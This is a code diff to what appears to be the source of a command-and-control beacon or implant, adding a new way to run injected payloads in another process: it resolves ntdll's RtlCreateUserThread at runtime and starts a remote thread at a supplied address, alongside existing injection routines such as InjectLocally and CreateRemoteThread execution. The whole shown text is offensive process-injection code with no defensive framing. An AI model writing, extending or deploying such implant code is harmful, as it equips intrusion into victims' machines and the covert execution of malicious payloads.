@@ -1,5 +1,7 @@
 #include "pch.h"
 
+#include <winternl.h>
+
 #include "beacon.h"
 #include "settings.h"
 
@@ -113,6 +115,9 @@ typedef WINBASEAPI FARPROC(WINAPI* FN_KERNEL32_GETPROCADDRESS)(_In_ HMODULE hMod
 typedef WINBASEAPI LPVOID(WINAPI* FN_KERNEL32_VIRTUALALLOC)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
 typedef WINBASEAPI BOOL(WINAPI* FN_KERNEL32_VIRTUALPROTECT)(_In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect);
 
+typedef CLIENT_ID *PCLIENT_ID;
+typedef NTSTATUS(NTAPI* FN_NTDLL_RTLCREATEUSERTHREAD)(_In_ HANDLE ProcessHandle, _In_opt_ PSECURITY_DESCRIPTOR SecurityDescriptor, _In_ BOOLEAN CreateSuspended, _In_opt_ ULONG StackZeroBits, _In_opt_ SIZE_T StackReserve, _In_opt_ SIZE_T StackCommit, _In_ PVOID StartAddress, _In_opt_ PVOID Parameter, _Out_opt_ PHANDLE ThreadHandle, _Out_opt_ PCLIENT_ID ClientId);
+
 BOOL IsWow64ProcessEx(HANDLE hProcess)
 {
 	HMODULE hModule = GetModuleHandleA("kernel32");
@@ -210,6 +215,22 @@ char* InjectLocally(char* payload, int size)
 BOOL ExecuteViaCreateRemoteThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)
 {
 	return CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL;
+}
+
+BOOL ExecuteViaRtlCreateUserThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)
+{
+	HMODULE hModule = GetModuleHandleA("ntdll.dll");
+	FN_NTDLL_RTLCREATEUSERTHREAD _RtlCreateUserThread = (FN_NTDLL_RTLCREATEUSERTHREAD)GetProcAddress(hModule, "RtlCreateUserThread");
+	if (_RtlCreateUserThread == NULL)
+	{
+		LERROR("Cannot find RtlCreateUserThread in ntdll.dll");
+		return FALSE;
+	}
+
+	CLIENT_ID ClientId;
+	HANDLE hThread = NULL;
+	_RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpStartAddress, lpParameter, &hThread, &ClientId);
+	return hThread != NULL;
 }
 
 void InjectAndExecute(INJECTION* injection, char* payload, int size, int pOffset, char* parameter)
